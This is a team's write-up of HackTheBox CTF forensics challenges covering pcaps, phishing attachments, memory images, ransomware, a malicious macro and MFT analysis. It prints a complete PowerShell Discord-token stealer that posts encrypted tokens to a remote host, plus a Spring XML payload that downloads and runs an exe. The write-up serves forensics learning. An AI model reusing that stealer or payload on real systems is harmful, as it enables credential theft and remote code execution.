# forensics

## It Has Begun
> Solved by : Starry-Lord

We only get a script.sh for this challenge

![script.sh content](https://i.imgur.com/MyKDVK7.png)


Running this file will actually kill your current user session authentication. Upon closer examination of what it does we can see that the host name for the ssh key looks awfully suspicious, and that a base64 string is being executed in bash at the end.

Reverse 1 and decode 2 for the flag:

`HTB{w1ll_y0u_St4nd_y0uR_Gr0uNd!!}`

---

## Urgent
> Solved by : Starry-Lord


![read mail](https://i.imgur.com/oveRek2.png)


This time it comes as an email file, along with an attachment called onlineform.js which is almost fully urlencoded:


![onlineform.html b64 encoded](https://i.imgur.com/8XbRhbU.png)

![VBSript hidden into an online html form](https://i.imgur.com/D4gfubx.png)


`HTB{4n0th3r_d4y_4n0th3r_ph1shi1ng_4tt3mpT}`

---

## An Unusual sighting
> Solved by : Starry-Lord

This challenge came with 2 interesting files which allowed to answer the questions asked at the docker url.

![Unusual hour for a login](https://i.imgur.com/QVg8sFq.png)


We can see a connection at around 4:00 AM which is not the usual legitimate users’ working hours.


![flag](https://i.imgur.com/a2dB23g.png)


`HTB{B3sT_0f_luck_1n_th3_Fr4y!!}`

---

## Phreaky
> Solved by : thewhiteh4t, Starry-Lord

The manual way:
This challenge comes with a packet capture file (.pcap) so wireshark it is.


![attachment in multiple parts](https://i.imgur.com/poOa5QP.png)


From this we can see that this b64 can be unziped with the passwords coming with each stream. We then need retrieve all 15 of them and use the corresponding unzip password.

We can copy all 15 parts and then merge them together to get the final pdf, with 

`cat file > phreaks_plan.pdf`
`cat file 2 >> phreaks_plan.pdf`


![retrieve all parts](https://i.imgur.com/jYkkXEe.png)


Automated solution using a python script :

- automatically find and extract zip files and passwords
- concatenate PDFs into one
- read PDF and get the flag

```python
    from scapy.all import *
    from zipfile import ZipFile
    from base64 import b64decode
    from pypdf import PdfReader
    
    tcp_streams = {}
    flag_pdf = 'flag.pdf'
    flag_pdf_bytes = bytes()
    
    pkts = rdpcap('./phreaky.pcap')
    for pkt in pkts:
        if not pkt.haslayer(TCP):
            continue
        if not hasattr(pkt[TCP], 'load'):
            continue
        src_ip = pkt[IP].src
        src_port = pkt[TCP].sport
        dst_ip = pkt[IP].dst
        dst_port = pkt[TCP].dport
        tcp_tuple = (src_ip, src_port, dst_ip, dst_port)
    
        if tcp_tuple in tcp_streams:
            tcp_streams[tcp_tuple] += pkt[TCP].load
        else:
            tcp_streams[tcp_tuple] = pkt[TCP].load
    
    for stream_key, stream_data in tcp_streams.items():
        if b'Secure File Transfer' not in stream_data:
            continue
        data = stream_data.decode('utf-8', errors='ignore')
    
        if 'Content-Type: multipart/mixed;' not in data:
            continue
    
        parts = data.split('Content-Type:')[1:]
    
        for part in parts:
            if 'Password' in part:
                password = part.split('Password:')[1].split('\r\n\r\n')[0].strip()
            if 'Content-Disposition: attachment;' in part:
                filename = part.split('filename*1="')[1].split('.zip"')[0] + '.zip'
                attachment = part.split('\r\n\r\n')[1].replace('\r\n', '').strip()
                print(f'Found : {filename} -> Password : {password}')
                with open(filename, 'wb') as outfile:
                    outfile.write(b64decode(attachment))
                with ZipFile(filename) as zf:
                    zip_out = zf.infolist()[0].filename
                    pswd = password.encode()
                    zf.extractall(pwd=pswd)
                    print(f'Extracted : {zip_out}')
    
                with open(zip_out, 'rb') as pdf_part:
                    flag_pdf_bytes += pdf_part.read()
    
    with open(flag_pdf, 'wb') as flag_out:
        flag_out.write(flag_pdf_bytes)
        print(f'\nFinal PDF Saved : {flag_pdf}')
    
    reader = PdfReader(flag_pdf)
    num_pages = len(reader.pages)
    pdf_text = ''
    for num in range(num_pages):
        curr_page = reader.pages[num]
        pdf_text += curr_page.extract_text()
    
    for line in pdf_text.split('\n'):
        if 'HTB{' in line:
            flag = 'HTB' + line.split('HTB')[1].split('}')[0] + '}'
            print(flag)
```


![](https://i.imgur.com/Emb4p1i.png)


`HTB{Th3Phr3aksReadyT0Att4ck}`

---

## Fake Boost
> Solved by : Starry-lord

For this one again we get a pcap file, which contains HTTP objects we can look into:

![HTTP Objects](https://i.imgur.com/TKtBdJf.png)


Extracting freediscordnitro, we can see the content is obfuscated like we expect a malware would be.


![freediscordnitro](https://i.imgur.com/njhbGkU.png)


working on the content of the file, we can now reverse this long string above, and then decode it to read the first part of the flag

```
    $URL = "http://192.168.116.135:8080/rj1893rj1joijdkajwda"
    
    function Steal {
        param (
            [string]$path
        )
    
        $tokens = @()
    
        try {
            Get-ChildItem -Path $path -File -Recurse -Force | ForEach-Object {
                
                try {
                    $fileContent = Get-Content -Path $_.FullName -Raw -ErrorAction Stop
    
                    foreach ($regex in @('[\w-]{26}\.[\w-]{6}\.[\w-]{25,110}', 'mfa\.[\w-]{80,95}')) {
                        $tokens += $fileContent | Select-String -Pattern $regex -AllMatches | ForEach-Object {
                            $_.Matches.Value
                        }
                    }
                } catch {}
            }
        } catch {}
    
        return $tokens
    }
    
    function GenerateDiscordNitroCodes {
        param (
            [int]$numberOfCodes = 10,
            [int]$codeLength = 16
        )
    
        $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        $codes = @()
    
        for ($i = 0; $i -lt $numberOfCodes; $i++) {
            $code = -join (1..$codeLength | ForEach-Object { Get-Random -InputObject $chars.ToCharArray() })
            $codes += $code
        }
    
        return $codes
    }
    
    function Get-DiscordUserInfo {
        [CmdletBinding()]
        Param (
            [Parameter(Mandatory = $true)]
            [string]$Token
        )
    
        process {
            try {
                $Headers = @{
                    "Authorization" = $Token
                    "Content-Type" = "application/json"
                    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36"
                }
    
                $Uri = "https://discord.com/api/v9/users/@me"
    
                $Response = Invoke-RestMethod -Uri $Uri -Method Get -Headers $Headers
                return $Response
            }
            catch {}
        }
    }
    
    function Create-AesManagedObject($key, $IV, $mode) {
        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    
        if ($mode="CBC") { $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC }
        elseif ($mode="CFB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CFB}
        elseif ($mode="CTS") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CTS}
        elseif ($mode="ECB") {$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::ECB}
        elseif ($mode="OFB"){$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::OFB}
    
    
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
        if ($IV) {
            if ($IV.getType().Name -eq "String") {
                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
            }
            else {
                $aesManaged.IV = $IV
            }
        }
        if ($key) {
            if ($key.getType().Name -eq "String") {
                $aesManaged.Key = [System.Convert]::FromBase64String($key)
            }
            else {
                $aesManaged.Key = $key
            }
        }
        $aesManaged
    }
    
    function Encrypt-String($key, $plaintext) {
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($plaintext)
        $aesManaged = Create-AesManagedObject $key
        $encryptor = $aesManaged.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
        [byte[]] $fullData = $aesManaged.IV + $encryptedData
        [System.Convert]::ToBase64String($fullData)
    }
    
    Write-Host "
    ______              ______ _                       _   _   _ _ _               _____  _____  _____   ___ 
    |  ___|             |  _  (_)                     | | | \ | (_) |             / __  \|  _  |/ __  \ /   |
    | |_ _ __ ___  ___  | | | |_ ___  ___ ___  _ __ __| | |  \| |_| |_ _ __ ___   `' / /'| |/' |`' / /'/ /| |
    |  _| '__/ _ \/ _ \ | | | | / __|/ __/ _ \| '__/ _` | | . ` | | __| '__/ _ \    / /  |  /| |  / / / /_| |
    | | | | |  __/  __/ | |/ /| \__ \ (_| (_) | | | (_| | | |\  | | |_| | | (_) | ./ /___\ |_/ /./ /__\___  |
    \_| |_|  \___|\___| |___/ |_|___/\___\___/|_|  \__,_| \_| \_/_|\__|_|  \___/  \_____/ \___/ \_____/   |_/
                                                                                                             
                                                                                                             "
    Write-Host "Generating Discord nitro keys! Please be patient..."
    
    $local = $env:LOCALAPPDATA
    $roaming = $env:APPDATA
    $part1 = "SFRCe2ZyMzNfTjE3cjBHM25fM3hwMDUzZCFf"
    
    $paths = @{
        'Google Chrome' = "$local\Google\Chrome\User Data\Default"
        'Brave' = "$local\BraveSoftware\Brave-Browser\User Data\Default\"
        'Opera' = "$roaming\Opera Software\Opera Stable"
        'Firefox' = "$roaming\Mozilla\Firefox\Profiles"
    }
    
    $headers = @{
        'Content-Type' = 'application/json'
        'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48 Safari/537.36'
    }
    
    $allTokens = @()
    foreach ($platform in $paths.Keys) {
        $currentPath = $paths[$platform]
    
        if (-not (Test-Path $currentPath -PathType Container)) {continue}
    
        $tokens = Steal -path $currentPath
        $allTokens += $tokens
    }
    
    $userInfos = @()
    foreach ($token in $allTokens) {
        $userInfo = Get-DiscordUserInfo -Token $token
        if ($userInfo) {
            $userDetails = [PSCustomObject]@{
                ID = $userInfo.id
                Email = $userInfo.email
                GlobalName = $userInfo.global_name
                Token = $token
            }
            $userInfos += $userDetails
        }
    }
    
    $AES_KEY = "Y1dwaHJOVGs5d2dXWjkzdDE5amF5cW5sYUR1SWVGS2k="
    $payload = $userInfos | ConvertTo-Json -Depth 10
    $encryptedData = Encrypt-String -key $AES_KEY -plaintext $payload
    
    try {
        $headers = @{
            'Content-Type' = 'text/plain'
            'User-Agent' = 'Mozilla/5.0'
        }
        Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $encryptedData
    }
    catch {}
    
    Write-Host "Success! Discord Nitro Keys:"
    $keys = GenerateDiscordNitroCodes -numberOfCodes 5 -codeLength 16
    $keys | ForEach-Object { Write-Output $_ }
```

We can see this is using AES encryption on the files while making the user think its generating free discord nitro keys, as well as a part1 of the flag.
It decrypted the content of the other file with using the same value for IV and for the AES key.


![b64 part 2 of flag](https://i.imgur.com/NynKykK.png)


`HTB{fr33_N17r0G3n_3xp053d!_b3W4r3_0f_T00_g00d_2_b3_7ru3_0ff3r5}` 

---

## Oblique Final
> Attempted by :  Starry-Lord, thewhiteh4t

This challenge occupied a good 3 days of our time and taught us a new attack vector so it gets its own writeup even if it got solved too late. Everything starts with a large 4GB `hiberfil.sys` file. This is a hibernation file that got extracted form a laptop after it got out of battery. We managed to extract the active memory from that which gave us 6GB of memory to look through. We used volatility 2 and 3 to achieve a better understanding of the machine, until we could find interesting files in the user’s home folder, and dig them for more.


Arsenal Recon offers a 30day trial for their tools and I decided to try it for the occasion. Very intuitively, I was guided through an ui that allowed to retrieve the Active memory as a bin file. With this 6GB file in the pocket it was time to finally work our volatility skills, allowing us to enumerate everything that was running while it went into hibernation.

```
    volatility 2:
    
    pslist
    filescan
    mftscan
    
    volatility 3:
    
    windows.filescan.FileScan
    windows.dumpfiles.DumpFiles
```

With these we managed to get the exact offset for each files, as well as a list of all the 4k+ files present on the machine to choose from. We extracted a lot of stuff before correlating the information that if it was not being used when it was running, it will not be in the memory. Basing ourselves on the pslist proved a little bit more useful, but in the end all we needed was TheGame.exe and TheGame.dll, which we had for quite some time.

From this point on the competition was over but we couldn’t just not finish it. 

Using ghidra, we managed to determine the exe was calling the dll. Using ILSpy, we can actually switch between C# , IL and ReadyToRun, which will actually return different outputs. So much so that nothing else than the following code in the Main function can be seen, when switching to ReadyToRun. not only does it look pretty different from the IL part, the offsets don’t seem to match, which points towards the latter being different code. This is concerning and something we have never seen before, but apparently it’s possible to make bogus code that will definitely fail and instead run the ReadyToRun part of the code.


![Ready To Run as an attack vector](https://i.imgur.com/GNbycDZ.png)


Extracing everything in that function with a simple hex editor, using the visible offsets, we can manage to get some valid shellcode. We know the architecture of this machine and it’s x64, from previous enumeration, which allowed us to use speakeasy to run it.

We can see this hidden shellcode is checking for a specific hostname in the windows environement variables, and we can change that by supplying a configuration file (default.json) to our command, conveniently supplied by mandiant in the github repo.


![Insane flag finally](https://i.imgur.com/pb8X7KW.png)


`HTB{IL_st0mp1ng_4nd_h1b3rn4t10n_f0r_th3_gr4nd_f1n4l!!}`


----------
## Confinement
> Solved by : Starry-Lord, thewhiteh4t


- Challenge description tells us about the location of flag : `Note: The valuable data is stored under \Documents\Work"`
- We are given an AD1 file which are logical images similar to a container. They only contain files, directories and the directory structure
- AD1 files don’t contain any kind of memory dump or deleted files
- What we see is all that we have in this case
- AD1 files can be parsed using FTK Imager software on windows, optionally we can export all the files using 7zForensics plugin for 7z archive manager.
- We used both at some point but one of them is enough for solving
- The file can also be mounted as a drive for faster operation
- Challenge tells us that files were encrypted by a ransomware and we need to find a way to decrypt them
- From our past experience we know that Windows Event Logs will shed some light on this so we started looking into them
- Most popular/common EVTX logs that everyone looks into :
    - Application.evtx
    - System.evtx
    - Security.evtx
    - Windows PowerShell.evtx
- We looked in all four and we could only find some of the commands which the attacker used
- The attacker disabled defender, launched recon tools and encryptor, all in the form of different exe files
- Since attacker did not use powershell for encrypting the files there was no way to figure out the encryption, we knew we needed to somehow get the encryptor, but attacker had deleted all the malicious exe files
- And we knew we can’t recover deleted files after trying to recover for some time :D
- This is where we got an idea :
    - Attacker had admin privileges
    - Defender was disabled by them
    - Why disabl e defender ? Because you don’t have a FUD encryptor!
    - Which means at some point the encryptor got caught by defender
- Now comes another useful EVTX log : `Windows Defender Operational`


![](https://i.imgur.com/DyT6U3Z.png)

- This log contains as you guessed the logs of it detecting malicious stuff among other things
- Inside we found what we were looking for :


![](https://i.imgur.com/ClSSOXE.png)

- Default action as we know is to quarantine the files
- So that means that the encryptor is in the quarantine and we can extract it
- Slight issue was that these files are encrypted too but we quickly found solutions for that such as :


https://blog.khairulazam.net/2023/12/12/extracting-quarantine-files-from-windows-defender/

https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor


![](https://i.imgur.com/V8Q4XOF.png)

- And we successfully got the juicy files


![](https://i.imgur.com/qNyiGdZ.png)



- We were able to decompile them over at : https://www.decompiler.com/
    
- Encryptor/Prorgam.cs :

```c#
    private static void Main(string[] args)
            {
                    Utility utility = new Utility();
                    PasswordHasher passwordHasher = new PasswordHasher();
                    if (Dns.GetHostName().Equals("DESKTOP-A1L0P1U", StringComparison.OrdinalIgnoreCase))
                    {
                            UID = utility.GenerateUserID();
                            utility.Write("\nUserID = " + UID, ConsoleColor.Cyan);
                            Alert alert = new Alert(UID, email1, email2);
                            email = string.Concat(new string[4] { email1, " And ", email2, " (send both)" });
                            coreEncrypter = new CoreEncrypter(passwordHasher.GetHashCode(UID, salt), alert.ValidateAlert(), alertName, email);
                            utility.Write("\nStart ...", ConsoleColor.Red);
                            Enc(Environment.CurrentDirectory);
                            Console.ReadKey();
                    }
            }
    
    static Program()
            {
                    email1 = "fraycrypter@korp.com";
                    email2 = "fraydecryptsp@korp.com";
                    alertName = "ULTIMATUM";
                    salt = "0f5264038205edfb1ac05fbb0e8c5e94";
                    softwareName = "Encrypter";
                    coreEncrypter = null;
                    UID = null;
            }
```

- Encryptor.class/PasswordHasher.cs :

```c#
    internal class PasswordHasher
    {
            public string GetSalt()
            {
                    return Guid.NewGuid().ToString("N");
            }
    
            public string Hasher(string password)
            {
                    using SHA512CryptoServiceProvider sHA512CryptoServiceProvider = new SHA512CryptoServiceProvider();
                    byte[] bytes = Encoding.UTF8.GetBytes(password);
                    return Convert.ToBase64String(sHA512CryptoServiceProvider.ComputeHash(bytes));
            }
    
            public string GetHashCode(string password, string salt)
            {
                    string password2 = password + salt;
                    return Hasher(password2);
            }
    
            public bool CheckPassword(string password, string salt, string hashedpass)
            {
                    return GetHashCode(password, salt) == hashedpass;
            }
    }
```

- Encryptor.class/CoreEncryptor.cs :

```c#
    public CoreEncrypter(string password, string alert, string alertName, string email)
            {
                    this.password = password;
                    this.alert = alert;
                    this.alertName = alertName;
                    this.email = email;
            }
    
    public void EncryptFile(string file)
            {
                    byte[] array = new byte[65535];
                    byte[] salt = new byte[8] { 0, 1, 1, 0, 1, 1, 0, 0 };
                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 4953);
                    RijndaelManaged rijndaelManaged = new RijndaelManaged();
                    rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
                    rijndaelManaged.Mode = CipherMode.CBC;
                    rijndaelManaged.Padding = PaddingMode.ISO10126;
                    rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
                    FileStream fileStream = null;
    .
    .
    .
```

- First, it checks if hostname matches a specific string
- Second, it generates a UID, which is what we see in the ransom note as Faction ID so we already have the UID for this specific ransom run
- Third, it creates the alert which is the ransom note
- Fourth it calls the encryptor and in function arguments it calls PasswordHasher and passes UID etc
    - GetHashCode concatenates password and salt then passes it to Hasher
    - Hasher flow :
        - Converts password to bytes
        - calculates SHA512 for the bytes
        - Base64 encodes the SHA512 hash
    - EncryptFile flow :
        - Uses the password i.e. result of Hasher and salt to derive bytes
        - Uses derived bytes to generate key and IV for AES encryption
        - Encrypts the bytes of the given file
- So to decrypt we can do the following :
    - we know the UID from the ransom note
    - we know the salt from Program.cs
    - we can re-generate output of Hasher from these
    - then we can use it to decrypt the file



```python
    import hashlib
    import base64
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    

    def decrypt_file(file_path, password):
        salt = b'\x00\x01\x01\x00\x01\x01\x00\x00'
        key_iv_bytes = PBKDF2(password, salt, dkLen=48, count=4953)
        key = key_iv_bytes[:32]  # needs to be 32
        iv = key_iv_bytes[32:]   # needs to be 16
        print(key.hex())
        print(iv.hex())
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted_file_path = file_path[:-5]  # Remove ".korp" extension
        with open(file_path, 'rb') as encrypted_file, open(decrypted_file_path, 'wb') as decrypted_file:
            decrypted_data = cipher.decrypt(encrypted_file.read())
            decrypted_file.write(decrypted_data)
    
        print(f"Decryption complete. Decrypted file: {decrypted_file_path}")
    
    
    def hasher(data):
        sha512 = hashlib.sha512()
        sha512.update(data.encode('utf-8'))
        return base64.b64encode(sha512.digest())
    
    
    def get_hash_code(password, salt):
        password_and_salt = password + salt
        return hasher(password_and_salt)
    
    
    password = '5K7X7E6X7V2D6F'
    salt = '0f5264038205edfb1ac05fbb0e8c5e94'
    
    hashed_password = get_hash_code(password, salt)
    
    
    file_to_decrypt = 'Applicants_info.xlsx.korp'
    password_to_use = hashed_password
    
    decrypt_file(file_to_decrypt, password_to_use)
```


![](https://i.imgur.com/uugjHuD.png)

![](https://i.imgur.com/F1XBI2w.png)

---

## Game Invitation
> Solved by : thewhiteh4t


- Challenge talks about receiving a malicious `docm` file in email
- We managed to solve the challenge using windows and MS Office 2016
- We inspected the `macros` in the document and here is a brief flow : 
    - it checks for host domain and proceeds if it matches
```
chkDomain = "GAMEMASTERS.local"
strUserDomain = Environ$("UserDomain")
If chkDomain <> strUserDomain Then
```
- opens the current document as binary mode 
`Open (ActiveDocument.FullName) For Binary As #gIvqmZwiW`
    - uses regex to match a set pattern
```
    SwMbxtWpP = StrConv(CbkQJVeAG, vbUnicode)
    Dim N34rtRBIU3yJO2cmMVu, I4j833DS5SFd34L3gwYQD
    Dim vTxAnSEFH
        Set vTxAnSEFH = CreateObject("vbscript.regexp")
        vTxAnSEFH.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        Set I4j833DS5SFd34L3gwYQD = vTxAnSEFH.Execute(SwMbxtWpP)
```
- gets `AppData` dir path and writes `mailform.js`
```
    kWXlyKwVj = Environ("appdata") & "\Microsoft\Windows"
    Set aMUsvgOin = CreateObject("Scripting.FileSystemObject")
    If Not aMUsvgOin.FolderExists(kWXlyKwVj) Then
    kWXlyKwVj = Environ("appdata")
    End If
    Set aMUsvgOin = Nothing
    Dim K764B5Ph46Vh
    K764B5Ph46Vh = FreeFile
    IAiiymixt = kWXlyKwVj & "\" & "mailform.js"
```
- uses `wscript` to run `mailform.js`
```
    Set R66BpJMgxXBo2h = CreateObject("WScript.Shell")
    R66BpJMgxXBo2h.Run """" + IAiiymixt + """" + " vF8rdgMHKBrvCoCp0ulm"
```

![](https://i.imgur.com/pmMXx2Y.png)

- Finally it runs clean up and deletes `mailform.js`
- First we can modify the domain check to bypass that condition
    ```
    chkDomain = "GAMEMASTERS.local"
    strUserDomain = Environ$("UserDomain") <-- original
    strUserDomain = "GAMEMASTERS.local"    <-- simply replace it with the domain
    If chkDomain <> strUserDomain Then
    ```
- In the `mailform.js` file we can add one extra statement to print the output of the function just before it hits `eval` as highlighted below :


![](https://i.imgur.com/8PPfPGU.png)



- Now we can use `csript` which is a CMD alternative of `wscript` to read the output it will print : 


![](https://i.imgur.com/WasZ239.png)

- In the noise we can see a `cookie`  being sent with a base64 string

```
> echo "SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=" | base64 -d
> HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}
```

---

## Data Siege
> Solved by : thewhiteh4t

```
We need to understand which data has been obtained from this attack to reclaim control of the and communication backbone. Note: flag is splitted in three parts.
```

- We need to look for exfiltrated data
- flag is split in three parts
- We have a PCAP file
- After analysis we can find an interesting frame :

```xml
    GET /nBISC4YJKs7j4I HTTP/1.1
    Cache-Control: no-cache
    Pragma: no-cache
    User-Agent: Java/11.0.19
    Host: 10.10.10.21:8080
    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
    Connection: keep-alive
    
    HTTP/1.1 200 OK
    Content-Type: application/xml
    Connection: Keep-Alive
    Pragma: no-cache
    Server: Apache
    Content-Length: 651
    
    <?xml version="1.0" encoding="UTF-8"?>
    <beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="WHgLtpJX" class="java.lang.ProcessBuilder" init-method="start">
      <constructor-arg>
        <list>
          <value>cmd.exe</value>
          <value>/c</value>
          <value><![CDATA[powershell Invoke-WebRequest 'http://10.10.10.21:8000/aQ4caZ.exe' -OutFile 'C:\temp\aQ4caZ.exe'; Start-Process 'c:\temp\aQ4caZ.exe']]></value>
        </list>
      </constructor-arg>
    </bean>
    </beans>
```

- Command execution where its downloading an `exe` file and running it with `PowerShell`
- Next thing we can extract the exe by exporting HTTP objects
- It’s a .NET executable so it can be decompiled easily using https://www.decompiler.com/
- EZRAClient/Program.cs
```c#
    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
    {
        86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
        116, 95, 83
    });
    
    Very_S3cr3t_S
```
- Converting ASCII values to text gives us an interesting string, this is the IV for AES
- multiple TCP packets have data field which contain encrypted strings which can be extracted using `tshark` :

`> tshark -T fields -e data -r capture.pcap > data.txt `

- Now let’s look at decryption process
- `EZRATclient.Utils/Constantes.cs` contains the encryption key

`private static string _encryptKey = "VYAemVeO3zUDTL6N62kVA";`

- Decrypt function is present in `Program.cs` :

```c#
    public static string Decrypt(string cipherText)
            {
                    try
                    {
                            string encryptKey = Constantes.EncryptKey;
                            byte[] array = Convert.FromBase64String(cipherText);
                            using (Aes aes = Aes.Create())
                            {
                                    Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(encryptKey, new byte[13]
                                    {
                                            86, 101, 114, 121, 95, 83, 51, 99, 114, 51,
                                            116, 95, 83
                                    });
                                    aes.Key = rfc2898DeriveBytes.GetBytes(32);
                                    aes.IV = rfc2898DeriveBytes.GetBytes(16);
                                    using MemoryStream memoryStream = new MemoryStream();
                                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
                                    {
                                            cryptoStream.Write(array, 0, array.Length);
                                            cryptoStream.Close();
                                    }
                                    cipherText = Encoding.Default.GetString(memoryStream.ToArray());
                            }
                            return cipherText;
                    }
                    catch (Exception ex)
                    {
                            Console.WriteLine(ex.Message);
                            Console.WriteLine("Cipher Text: " + cipherText);
                            return "error";
                    }
            }
```

- We have the IV and encryption key, python script for decryption :

```python
    #!/usr/bin/env python3
    
    import binascii
    from base64 import b64decode
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    from Crypto.Protocol.KDF import PBKDF2
    
    with open('data.txt') as datafile:
            hex_lines = datafile.readlines()
    
    
    def derive_key_and_iv(password, salt):
            key_iv_bytes = PBKDF2(password, salt, dkLen=48)
            key = key_iv_bytes[:32]
            iv = key_iv_bytes[32:]
            return key, iv
    
    
    encryption_key = "VYAemVeO3zUDTL6N62kVA"
    salt = 'Very_S3cr3t_S'
    key, iv = derive_key_and_iv(encryption_key.encode(), salt)
    
    
    def decrypt(cipher_text, key, iv):
            cipher_text = b64decode(cipher_text)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decoded_msg = unpad(cipher.decrypt(cipher_text), AES.block_size).decode()
            return decoded_msg
    
    
    for hex_line in hex_lines:
            if len(hex_line) > 3:
                    enc_cipher_text = binascii.unhexlify(hex_line.strip()).replace(b'24\xa7', b'').replace(b'88\xa7', b'').replace(b'44\xa7', b'').replace(b'64\xa7', b'').replace(b'620\xa7', b'')
                    # print('-->', binascii.unhexlify(hex_line.strip()))
                    try:
                            print(decrypt(enc_cipher_text, key, iv))
                    except Exception:
                            pass
```

![](https://i.imgur.com/tSmJrRQ.png)


- We get first and second parts of the flag in the decrypted data :
```
-> HTB{c0mmun1c4710n5
-> _h45_b33n_r357
```
- Third part was easier as its present in the PCAP
- One of the frames is not encrypted and its a `PowerShell` command :


![](https://i.imgur.com/pY3xCRo.png)

- We can decode the payload to get the third part of the flag


![](https://i.imgur.com/SZX8tPa.png)

```
-> HTB{c0mmun1c4710n5
-> _h45_b33n_r357
-> 0r3d_1n_7h3_h34dqu4r73r5}

HTB{c0mmun1c4710n5_h45_b33n_r3570r3d_1n_7h3_h34dqu4r73r5}
```

---

## Pursue the tracks
> Solved by : thewhiteh4t

`To get the flag, you need to answer the questions from the docker instance.`


- We get a `.mft` file in this challenge and we need to answer questions based on that
- Tools used :
    - analyzeMFT.py - https://github.com/dkovar/analyzeMFT
    - MFTExplorer - https://www.sans.org/tools/mftexplorer/
    - MFTECmd - https://github.com/EricZimmerman/MFTECmd
- First we extracted the data in CSV format on linux : 
    - `analyzeMFT.py -f z.mft -o result.csv`


![](https://i.imgur.com/oYrBlKt.png)

- with some grep-cut we can see a list of files :


![](https://i.imgur.com/XOSWO0p.png)

- Some pointers which are important for solving :
    - analyzeMFT.py shows limited information so for things like Q6 its easily visible in MFTExplorer
    - Modified after creation in Q7 is also visible in MFTExplorer
    - Accurate file size in Q9 is not shown by either analyzeMFT or MFTExplorer for that we had to use MFTECmd
- Answers of all the questions : 

```
Q1. Files are related to two years, which are those?
> 2023,2024

Q2. There are some documents, which is the name of the first file written?
> Final_Annual_Report.xlsx

Q3. Which file was deleted?
> Marketing_Plan.xlsx

Q4. How many of them have been set in Hidden mode?
> 1

Q5. Which is the filename of the important TXT file that was created?
> credentials.txt

Q6. A file was also copied, which is the new filename?
> Financial_Statement_draft.xlsx

Q7. Which file was modified after creation?
> Project_Proposal.pdf

Q8. What is the name of the file located at record number 45?
> Annual_Report.xlsx

Q9. What is the size of the file located at record number 40?
> 57344
```

![](https://i.imgur.com/9wycXOw.png)


